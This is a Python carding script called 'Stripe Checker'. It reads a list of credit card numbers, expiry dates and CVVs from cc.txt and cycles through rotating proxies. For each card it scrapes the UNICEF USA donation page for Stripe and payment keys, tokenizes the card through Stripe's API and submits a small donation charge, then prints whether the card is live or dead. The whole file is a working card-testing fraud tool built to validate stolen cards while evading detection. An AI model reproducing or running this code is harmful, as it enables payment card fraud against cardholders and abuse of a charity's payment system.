#-*- coding: utf-8 -*-
from bs4 import BeautifulSoup
from itertools import cycle
import requests
import json
import os


class StripeChecker():

    def __init__(self):
        self.checker_name = "Stripe Checker"
        self.first_link = "https://donate.unicefusa.org/page/contribute/help-save-childrens-lives-29161"
        self.second_link = "https://donate.unicefusa.org/page/cde/Api/Validate/v1/"
        self.third_link = "https://api.stripe.com/v1/tokens"
        self.fourth_link = "https://platform.qd.bsd.net/api/charge"
        self.banner = """
\t------------========== STRIPE CHECKER ==========------------
\t                 -= Develop by Codekiller =-
\t                 [DONT LEECH, SAYANG 150 MO]
\t------------====================================------------
        """
        print(self.banner)
        self.stripe()


    def stripe(self):
        proxy_lists = []
        print()
        firstname = str(input("--=[ Enter First Name : "))
        lastname  = str(input("--=[ Enter First Name : "))
        Street    = str(input("--=[ Enter Street     : "))
        City      = str(input("--=[ Enter City       : "))
        State     = str(input("--=[ Enter Region     : "))
        ZipCode   = str(input("--=[ Enter ZipCode    : "))
        Phone     = str(input("--=[ Enter Phone #    : "))
        Email     = str(input("--=[ Enter Email      : "))

        creds = f"""
 .--Summarize of Credentials:
 |-  FirstName    |    {firstname}
 |-  LastName     |    {lastname}       
 |-  Street       |    {Street}
 |-  City         |    {City}
 |-  ZipCode      |    {ZipCode}
 |-  Phone        |    {Phone}
 |-  Email        |    {Email}
   [NOTE: PAG MAY NAKALIMUTAN KA LAGYAN OR NAGKAMALI RESTART MO YUNG PROGRAM YAWA]
"""
        print(creds)
        input("[PRESS ENTER TO CONTINUE]")
        print("[*] Checking Proxies.txt")
        
        if os.path.exists('proxies.txt'):
            print("[+] Proxies: ✓")
        else:
            print("[!] Proxies: NOT FOUND")
            exit(1)
        
        print('[*] Checking cc.txt')

        if os.path.exists('cc.txt'):
            print("[+] CreditCards: ✓")
        else:
            print("[!] CreditCards: NOT FOUND")
            exit(1)

        print("[+] Checking Start!")
        print("=" * (os.get_terminal_size()[0] - 1))
        print()
        with open('proxies.txt', 'r') as proxy_list:
            proxy = proxy_list.read()
            proxy = proxy.split('\n')
            for x in proxy:

                try:
                    url, port, user, password = x.split(':')
                    proxy_lists.append('http://' + user + ':' + password + '@' + url + ':' + port)
                except ValueError:
                    pass

            proxy_pool = cycle(proxy_lists)

        cc_list = open('cc.txt', 'r').read()
        cc_list = cc_list.split('\n')
        ccentry = 0

        for credit_card in cc_list:
            ccentry += 1
            proxy_to_use = next(proxy_pool)
            ccnum, ccmonth, ccyear, cccvv = credit_card.split('|')
            cctype = ("visa" if ccnum[0] == "4" else 'mc')

            cursess = requests.Session()
            ip_address = cursess.get("https://www.my-ip.io/api", proxies={'https': proxy_to_use}).text
            keys = BeautifulSoup(cursess.get(self.first_link, proxies={'https': proxy_to_use}).text, 'html.parser')
            stripe_pkey = keys.find('script', {'id': 'uqd-config'})['data-stripe_pkey']
            data_uqd_pkey = keys.find('script', {'id': 'uqd-config'})['data-uqd_pkey']


            first_data = {
                "currency":"USD",
                "slug":"help-save-childrens-lives-29161",
                "submission_key":'EJrwPaArggSDSuhnnfUD2Lcop8L3sBqC',
                "http_referer":"",
                "http_host":'donate.unicefusa.org',
                "ip_addr":ip_address,
                "request_uri":'/page/contribute/help-save-childrens-lives-29161',
                "event_attendee_id":'',
                "outreach_page_id":'',
                "stg_signup_id":'',
                "mailing_link_id":'',
                "mailing_recipient_id":'',
                "match_campaign_id":'',
                "match_is_pledge":'',
                "pledge_is_convert":'',
                "contributor_key":'',
                "guid":'',
                "quick_donate_populated":'0',
                "device_fingerprint":'0',
                "intl_currency_symbol":"USD",
                "default_country":"US",
                "cc_number_ack":"",
                "initialms":"",
                "mailcode":"",
                "k-ris-sid":"okMsWY12twnAuAm7uxwl37IPoFQWImzk",
                "k-ris-mid":"170850",
                "kount_chapter_id":"1",
                "kount_contribution_page_id":"137",
                "kount_gateway_id":"2",
                "page_title":"Help Save Children's Lives",
                "organization_name": "",
                "client_slug":"usflive",
                "chapter_id":"1",
                "amount":"other",
                "amount_other":"5",
                "country":"PH",
                "firstname":firstname,
                "lastname":lastname,
                "addr1":Street,
                "addr2":"",
                "city":City,
                "state_cd":State,
                "zip":ZipCode,
                "email":Email,
                "phone":Phone,
                "cc_type_cd":cctype,
                "cc_number":ccnum,
                "cc_expir_month":ccmonth,
                "cc_expir_year":ccyear,
                "bestcontacttime":"",
                "ignore_list":[],
                "success":"true",
            }

            first_data_response = json.loads(cursess.post(self.second_link, data=first_data, proxies={"https": proxy_to_use}).text)
            invoice_data = first_data_response['reporting_data']['invoice_id']


            second_data = {
                "time_on_page":"177540",
                "pasted_fields":"number",
                "guid":"8fc7ebf9-51ff-41d9-b716-2149335744c5",
                "muid":"8d0aace5-d53a-4dc6-8a5b-7bbb4f5e19d9",
                "sid":"dbcbfde4-0447-4aea-bb29-157a0c42d5ca",
                "key":stripe_pkey,
                "payment_user_agent":"stripe.js/303cf2d",
                "card[number]":ccnum,
                "card[cvc]":cccvv,
                "card[exp_month]":ccmonth,
                "card[exp_year]":ccyear,
                "card[name]":firstname + ' ' + lastname,
                "card[address_zip]": ZipCode,
            }
            
            second_data_response = json.loads(cursess.post(self.third_link, data=second_data, proxies={"https": proxy_to_use}).text)
            stripe_token_id = second_data_response['id']
            cc_last_four = second_data_response['card']['last4']


            last_data = {
                "source_id":'InObrkCq1rQ7Hemm6GYEebGLmiGU9VFK',
                "amount":"529",
                "is_recurring":'0',
                "kount[gateway_id]":'2',
                "kount[contribution_page_id]":'137',
                "kount[chapter_id]":'1',
                "description":'Help Save Children’s L',
                "metadata[currency]":'USD',
                "metadata[slug]":'help-save-childrens-lives-29161',
                "metadata[submission_key]":'InObrkCq1rQ7Hemm6GYEebGLmiGU9VFK',
                "metadata[http_referer]":"",
                "metadata[http_host]":"donate.unicefusa.org",
                "metadata[ip_addr]":ip_address,
                "metadata[request_uri]":"/page/contribute/help-save-childrens-lives-29161",
                "metadata[event_attendee_id]":"",
                "metadata[outreach_page_id]":"",
                "metadata[stg_signup_id]":"",
                "metadata[mailing_link_id]":"",
                "metadata[mailing_recipient_id]":"",
                "metadata[match_campaign_id]":"",
                "metadata[match_is_pledge]":"",
                "metadata[pledge_is_convert]":"",
                "metadata[contributor_key]":"",
                "metadata[guid]":"",
                "metadata[quick_donate_populated]":"0",
                "metadata[device_fingerprint]":"0",
                "metadata[intl_currency_symbol]":"USD",
                "metadata[default_country]":"US",
                "metadata[cc_number_ack]":"",
                "metadata[initialms]":"",
                "metadata[mailcode]":"",
                "metadata[k-ris-sid]":"InObrkCq1rQ7Hemm6GYEebGLmiGU9VFK",
                "metadata[k-ris-mid]":"170850",
                "metadata[kount_chapter_id]":"1",
                "metadata[kount_contribution_page_id]":"137",
                "metadata[kount_gateway_id]":"2",
                "metadata[page_title]":"Help Save Children's Lives",
                "metadata[organization_name]":"",
                "metadata[client_slug]":"usflive",
                "metadata[chapter_id]":'1',
                "metadata[bestcontacttime]":"",
                "metadata[invoice_id]":invoice_data,
                "metadata[url_amt]":"",
                "metadata[qd_code]":"",
                "metadata[form_amts]":"75,100,150,250,500,other-5",
                "metadata[from_url]":"0",
                "kount_hash":"VM9ETVYH7MSOGZQE",
                "email":Email,
                "phone":Phone,
                "first_name":firstname,
                "last_name":lastname,
                "address1":Street,
                "address2":"",
                "city":City,
                "state":State,
                "zip":ZipCode,
                "country":"PH",
                "cc_expire_year":ccyear,
                "cc_expire_month":ccmonth,
                "currency":"PHP",
                "page_title":"Help Save Children's Lives",
                "stripe_token":stripe_token_id,
                "cc_last_four":cc_last_four,
                "cc_type":('Visa' if cctype == 'visa' else "MasterCard"),
                "full_gift":"1",
                "max_contribution":"0",
                "selected_amount":"500",
                "api_key":data_uqd_pkey,
                "referrer":"https://donate.unicefusa.org/",
            }

            last_data_response = json.loads(cursess.post(self.fourth_link, data=last_data, proxies={"https": proxy_to_use}).text)

            if last_data_response['status'] == 0:
                print("╭───── " + ccnum + '|' + ccmonth + '|' + ccyear + '|' + cccvv + '─[' + str(ccentry) + ']')
                print('╰─── DEAD  ==>' + '\tError: ' + last_data_response['message'][:34])
                print()
            else:
                print(last_data_response)
                print('|-> ' + ccnum + '|' + ccmonth + '|' + ccyear + '|' + cccvv + '\tError: ' + last_data_response['message'])
            
        print()
        print("=" * (os.get_terminal_size()[0] - 1))
        print('[+] CHECKING DONE!')


StripeChecker()
